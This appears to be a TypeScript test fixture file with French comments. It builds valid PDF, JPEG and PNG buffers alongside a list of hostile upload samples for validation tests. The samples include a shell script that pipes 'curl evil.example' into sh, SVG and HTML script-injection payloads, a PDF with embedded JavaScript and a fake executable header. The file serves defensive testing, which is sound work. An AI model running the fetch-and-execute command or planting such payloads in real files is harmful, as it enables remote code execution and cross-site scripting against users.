// Fichiers de test valides, construits octet par octet (aucun fichier binaire dans le dépôt).
export const pdf = (body = '1 0 obj << /Type /Catalog >> endobj') => Buffer.from(`%PDF-1.4\n${body}\ntrailer << /Root 1 0 R >>\n%%EOF\n`, 'latin1');

export const jpeg = () => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]), Buffer.from('JFIF'), Buffer.alloc(40, 1), Buffer.from([0xff, 0xd9])]);

export const png = () =>
  Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from([0x00, 0x00, 0x00, 0x0d]),
    Buffer.from('IHDR'),
    Buffer.alloc(13, 1),
    Buffer.alloc(4, 2),
    Buffer.from([0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82]),
  ]);

/** Contenus dangereux ou invalides, avec le type MIME qu'un attaquant déclarerait. */
export const malicious: Array<[string, Buffer]> = [
  ['exécutable Windows', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(300, 0x90)])],
  ['page HTML avec script', Buffer.from('<html><script>fetch("/api/v1/users/me")</script></html>')],
  ['SVG avec script', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')],
  ['script shell', Buffer.from('#!/bin/sh\ncurl evil.example | sh\n')],
  ['archive ZIP', Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(100)])],
  ['PDF avec JavaScript', pdf('<< /S /JavaScript /JS (app.alert(1)) >>')],
  ['PDF tronqué', Buffer.from('%PDF-1.4\n1 0 obj << >> endobj')],
];
